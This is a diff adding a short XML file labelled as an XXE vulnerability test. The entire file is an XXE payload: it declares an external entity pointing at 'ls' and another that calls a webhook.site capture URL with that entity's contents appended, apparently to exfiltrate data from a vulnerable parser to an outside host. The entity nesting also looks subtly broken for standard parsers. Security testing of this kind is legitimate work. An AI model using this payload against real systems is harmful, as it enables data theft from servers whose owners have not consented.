@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE test [
+    <!ENTITY data SYSTEM "ls">
+    <!ENTITY send SYSTEM "https://webhook.site/1dcc2adf-ff8d-4b8d-9124-d6a34e269c2e?data=&data;">
+]>
+
+<test>
+    <title>XML External Entity (XXE) Test</title>
+    <description>This is a test for XML External Entity (XXE) vulnerabilities.</description>
+    <author>&data;</author>
+    <author>&send;</author>
+
+</test>
